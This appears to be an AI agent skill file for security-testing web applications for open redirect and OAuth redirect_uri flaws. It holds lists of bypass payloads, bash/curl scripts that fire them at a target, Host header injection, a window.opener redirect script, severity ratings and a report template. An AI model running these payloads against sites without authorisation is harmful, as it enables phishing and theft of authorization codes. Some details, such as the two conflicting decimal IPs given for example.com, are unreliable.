---
description: Find CALLBACK vulnerabilities in web applications. Use when testing for CALLBACK issues.
---

# Web Application Callback/Redirect Security Testing

## High-Value Patterns from Real Reports

### Vulnerable Parameters
```bash
# Common redirect parameter names
REDIRECT_PARAMS="redirect_url redirect rurl return_to prejoin_data domain_name next wp_http_referer logout"

# OAuth callback parameters  
OAUTH_PARAMS="redirect_uri callback state scope"

# URL encoding variations
URL_ENCODED="%2F%2F %E3%80%82 %3A %23"
```

### Vulnerable Endpoint Patterns
```bash
# Common vulnerable paths
VULNERABLE_PATHS=(
    "/auth/login/"
    "/oauth/authorize"
    "/services/*/preview/*"
    "/logout"
    "/linkfilter/"
    "/tipping/purchase_success/"
    "/index.php/"
    "//[DOMAIN]/"
    "/@[DOMAIN]"
    "#/path///"
    "/%2F[ID]"
)
```

### Payload Patterns
```bash
# Domain-based payloads
DOMAIN_PAYLOADS=(
    "//example.com"
    "///example.com" 
    "////example.com"
    "@example.com"
    "#sub.example.com"
    "。com"  # Unicode dot bypass
    "Http:3627732462"  # Decimal IP
    "/index.php.attacker.com"
)

# Fragment/hash-based
FRAGMENT_PAYLOADS=(
    "#/\\example.com/"
    "#/path///example.com"
)
```

## Discovery Commands

### 1. Find Potential Callback Endpoints
```bash
# Crawl for callback/redirect parameters
crawl_redirects() {
    local target="$1"
    echo "Discovering redirect endpoints..."
    
    # Search for redirect parameters in responses
    curl -s "$target" | grep -oE "(redirect_url|redirect|rurl|return_to|next)=[^&]*" | head -20
    
    # Check common OAuth endpoints
    for endpoint in "/oauth/authorize" "/auth/login" "/logout"; do
        curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" "$target$endpoint"
    done
}

# Find JavaScript redirect patterns
find_js_redirects() {
    local target="$1"
    curl -s "$target" | grep -oE "window\.location\s*=|redirect_url.*=|location\.replace" | head -10
}
```

### 2. Parameter Discovery
```bash
# Discover redirect parameters via paramspider/wayback
discover_params() {
    local domain="$1"
    
    # Check wayback machine for redirect parameters
    curl -s "http://web.archive.org/cdx/search/cdx?url=*.$domain/*&output=text&fl=original&collapse=urlkey" | \
        grep -oE "(redirect|return|callback|next)=[^&]*" | sort -u
    
    # Test common parameter locations
    for param in $REDIRECT_PARAMS; do
        echo "Testing parameter: $param"
        test_redirect_param "$domain" "$param"
    done
}
```

## Step-by-Step Testing Methodology

### Phase 1: Basic Open Redirect Detection
```bash
test_basic_redirect() {
    local target="$1"
    local param="$2"
    
    echo "[*] Testing basic redirect on $target with parameter $param"
    
    # Test double slash bypass
    curl -s -L -w "Final URL: %{url_effective}\nStatus: %{http_code}\n" \
        "$target?$param=//example.com" | tail -2
    
    # Test protocol-relative URL
    curl -s -L -w "Final URL: %{url_effective}\n" \
        "$target?$param=https://example.com"
    
    # Test subdomain bypass
    curl -s -L -w "Final URL: %{url_effective}\n" \
        "$target?$param=https://example.com.attacker.com"
}
```

### Phase 2: Advanced Bypass Testing
```bash
test_advanced_bypasses() {
    local target="$1"
    local param="$2"
    
    echo "[*] Testing advanced bypasses..."
    
    # Unicode dot bypass
    test_payload="https://example%E3%80%82com"
    curl -s -L -w "Status: %{http_code} Final: %{url_effective}\n" \
        "$target?$param=$test_payload"
    
    # Decimal IP conversion (example.com = 1572395042)
    curl -s -L -w "Final URL: %{url_effective}\n" \
        "$target?$param=Http:1572395042"
    
    # Fragment bypass
    curl -s -L -w "Final URL: %{url_effective}\n" \
        "$target?$param=https://legit.com%23https://evil.com"
    
    # Host header injection
    curl -s -H "Host: evil.com#sub.target.com" -w "Location: %{redirect_url}\n" "$target"
}
```

### Phase 3: OAuth Redirect Testing  
```bash
test_oauth_redirect() {
    local target="$1"
    
    echo "[*] Testing OAuth redirect_uri bypass..."
    
    # Find OAuth authorize endpoint
    oauth_endpoint=$(curl -s "$target" | grep -oE "/oauth/authorize[^\"]*" | head -1)
    
    if [[ -n "$oauth_endpoint" ]]; then
        # Test redirect_uri manipulation
        curl -s -L -w "Final URL: %{url_effective}\n" \
            "$target$oauth_endpoint&redirect_uri=https://evil.com&scope=invalid"
            
        # Test state parameter bypass
        curl -s -L -w "Final URL: %{url_effective}\n" \
            "$target$oauth_endpoint&redirect_uri=https://evil.com&state=../../../evil.com"
    fi
}
```

### Phase 4: Context-Specific Testing
```bash
# Test logout redirects
test_logout_redirect() {
    local target="$1"
    
    curl -s -L -w "Final URL: %{url_effective}\n" "$target/logout?next=//evil.com"
    curl -s -L -w "Final URL: %{url_effective}\n" "$target/?logout=https://evil.com"
}

# Test theme/service redirects  
test_service_redirect() {
    local target="$1"
    
    curl -s -L -w "Final URL: %{url_effective}\n" \
        "$target/services/theme/preview/test?domain_name=evil.com"
}

# Test file/attachment redirects
test_attachment_redirect() {
    local target="$1"
    
    curl -s -L -w "Final URL: %{url_effective}\n" \
        "$target/attachment?url=//evil.com"
}
```

### Phase 5: Window.opener Testing
```bash
test_window_opener() {
    local target="$1"
    
    # Create test HTML payload
    cat > /tmp/opener_test.html << EOF
<html>
<script>
if (window.opener) {
    window.opener.location.replace('https://evil.com');
}
</script>
<body>Testing window.opener redirect</body>
</html>
EOF
    
    echo "[*] Upload test file and check if target opens links with target='_blank' without rel='noopener'"
    echo "Test payload created at /tmp/opener_test.html"
}
```

## Complete Testing Script
```bash
#!/bin/bash
full_redirect_test() {
    local target="$1"
    
    echo "=== Starting Comprehensive Redirect Testing for $target ==="
    
    # Phase 1: Discovery
    crawl_redirects "$target"
    discover_params "$target" 
    
    # Phase 2: Parameter testing
    for param in $REDIRECT_PARAMS; do
        echo -e "\n[*] Testing parameter: $param"
        test_basic_redirect "$target" "$param"
        test_advanced_bypasses "$target" "$param"
    done
    
    # Phase 3: OAuth testing
    test_oauth_redirect "$target"
    
    # Phase 4: Context-specific
    test_logout_redirect "$target"
    test_service_redirect "$target" 
    test_attachment_redirect "$target"
    
    # Phase 5: Path-based redirects
    for payload in "${DOMAIN_PAYLOADS[@]}"; do
        echo "[*] Testing path: $target$payload"
        curl -s -L -w "Final: %{url_effective}\n" "$target$payload"
    done
    
    echo "=== Testing Complete ==="
}
```

## Severity Rating Table

| Scenario | Severity | CVSS | Criteria |
|----------|----------|------|----------|
| Unauthenticated open redirect to any domain | Medium | 6.5 | Basic redirect without validation |
| Post-authentication redirect with token leak | High | 8.2 | Credentials/tokens sent to attacker domain |
| OAuth redirect_uri bypass | High | 7.8 | Can capture authorization codes |
| Host header injection redirect | Medium | 6.1 | Password reset/email links poisoned |
| Window.opener redirect | Medium | 5.4 | Requires user interaction |
| Internal/relative redirect only | Low | 3.1 | Limited to same domain |

## False Positives to Ignore

```bash
# These are NOT vulnerabilities:
FALSE_POSITIVES=(
    # Same-domain redirects
    "redirect to *.target.com"
    
    # Blocked redirects returning error pages
    "HTTP 400/403/500 on redirect attempt"
    
    # Redirects requiring valid authentication that attackers can't obtain
    "authenticated redirect with unguessable tokens"
    
    # Redirects with proper whitelist validation
    "only redirects to whitelisted domains"
    
    # Fragment-only changes (not full redirects)
    "only changes URL fragment/hash"
)

is_false_positive() {
    local response="$1"
    
    # Check if redirect stayed on same domain
    if echo "$response" | grep -q "Final URL:.*$(echo $TARGET | cut -d'/' -f3)"; then
        echo "FALSE POSITIVE: Same domain redirect"
        return 0
    fi
    
    # Check for error responses
    if echo "$response" | grep -qE "Status: (400|403|404|500)"; then
        echo "FALSE POSITIVE: Error response"
        return 0
    fi
    
    return 1
}
```

## Finding Report Template

```markdown
# Open Redirect Vulnerability

## Summary
An open redirect vulnerability exists in [ENDPOINT] that allows attackers to redirect users to arbitrary external domains.

## Vulnerability Details
- **Endpoint**: [URL]
- **Parameter**: [PARAMETER_NAME] 
- **Method**: [GET/POST]
- **Authentication**: [Required/Not Required]

## Proof of Concept
```bash
# Basic redirect test
curl -L "https://target.com/endpoint?redirect=//evil.com"

# Bypass attempt
curl -L "https://target.com/endpoint?redirect=https://evil%E3%80%82com"
```

**Vulnerable Request:**
```
GET /endpoint?redirect_url=//evil.com HTTP/1.1
Host: target.com
```

**Response:**
```
HTTP/1.1 302 Found
Location: https://evil.com
```

## Impact
- **Phishing**: Attackers can create convincing phishing URLs using the legitimate domain
- **Credential Theft**: Users may enter credentials on attacker-controlled domains
- **Token Leakage**: Authentication tokens may be sent to attacker domains via referrer
- **Social Engineering**: Legitimate domain increases user trust

## Steps to Reproduce
1. Visit: `https://target.com/endpoint?redirect=//evil.com`
2. Observe redirect to `https://evil.com`
3. Confirm redirect works in major browsers

## Remediation
1. Implement whitelist validation for redirect URLs
2. Use relative URLs only when possible  
3. Add user warning for external redirects
4. Validate URL schemes and domains
5. Add `rel="noopener"` to external links

## References
- [CWE-601: URL Redirection to Untrusted Site](https://cwe.mitre.org/data/definitions/601.html)
- [OWASP: Unvalidated Redirects and Forwards](https://owasp.org/www-project-top-ten/2017/A10_2017-Unvalidated_Redirects_and_Forwards)
```